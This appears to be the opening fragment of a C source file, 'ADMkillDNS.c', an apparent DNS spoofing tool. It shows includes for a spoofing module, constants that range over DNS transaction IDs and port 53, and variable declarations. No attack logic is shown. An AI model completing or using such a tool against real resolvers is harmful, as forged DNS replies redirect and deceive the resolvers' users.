&lt;++&gt; ADMIDpack/ADMkillDNS.c

#include &quot;ADM-spoof.c&quot;
#include &quot;dns.h&quot;
#include &quot;ADMDNS2.c&quot;

#define   ERROR     -1
#define   VERSION  &quot;0.3 pub&quot;
#define   ID_START  1
#define   ID_STOP   65535
#define   PORT_START  53
#define   PORT_STOP   54

void main(int argc, char **argv)
   {
        
	 struct   dnshdr *dns;
	 char            *data;
         char            buffer2[4000];
         unsigned char   namez[255];    
	 unsigned long   s_ip,s_ip2;
	 unsigned long   d_ip,d_ip2;
